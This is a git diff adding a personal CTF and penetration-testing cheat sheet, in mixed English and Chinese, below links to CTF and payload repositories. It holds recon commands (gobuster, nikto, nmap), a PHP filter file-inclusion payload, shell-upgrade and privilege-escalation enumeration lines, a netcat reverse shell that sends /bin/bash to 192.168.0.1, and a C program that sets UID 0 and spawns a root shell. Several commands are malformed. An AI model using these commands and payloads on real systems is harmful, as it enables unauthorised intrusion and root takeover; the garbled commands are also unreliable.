@@ -1,3 +1,49 @@
 https://github.com/JohnHammond/ctf-katana
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
 https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6   // jwk crack learn
+
+export IP=127.0.0.1
+
+gobuster -u url -w /opt/directory-list-2.3=medium.txt  -x php ,sh,txt,cgi,html,js,css,py,bak,~
+
+nikto -h url | tee nikto.log
+
+nmap   -sC -sV oN  dir -v  IP/directory
+
+grep -Ri 
+grep -oE 用正则表达式搜索
+
+"python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+
+php://filter/convert.base64-encode/resource=index
+
+ssh username@ipadderss -p port
+
+
+sudo -l
+
+find  / -user [用户名如 root] 2>/dev/null (查找该用户的所有文件)
+xxd
+
+find / -perm ug=rwx 2>/dev/null
+
+cewl url://ip/index.txt  wordlist.txt 将一个网页上的字符生成密码字典
+
+gobuster -w -q -p  http://ip/index.php -e txt php jsp css ..
+
+
+nc -lvp (192.168.0.1) 4444
+nc 192.168.0.1 4444 -e /bin/bash  连接到192.168.0.1 4444 并弹一个shell给192.168.0.1
+
+
+linux一个提权程序
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main()
+{
+	setuid(0);
+	setgid(0);
+	system("/bin/bash");
+	return 0;
+}
